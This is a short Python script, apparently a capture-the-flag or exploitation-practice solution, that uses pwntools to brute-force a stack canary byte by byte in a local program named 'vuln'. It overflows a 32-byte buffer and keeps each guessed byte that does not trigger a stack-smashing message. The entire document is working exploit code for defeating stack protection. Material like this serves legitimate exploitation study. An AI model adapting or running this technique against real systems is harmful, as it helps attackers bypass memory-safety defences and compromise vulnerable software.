from pwn import *

# first brute force canary
canary = ''
for i in range(1, 5):
    for e in range(256):
        sh = process('./vuln')
        # tell program to read in specific length
        sh.sendlineafter('> ', str(32 + i))

        # send canary guess
        sh.sendafter('> ', 'a'*32+canary+chr(e))
        output = sh.recvall()
        if 'Stack' not in output:
            print output
            canary += chr(e)
            break

print(canary)
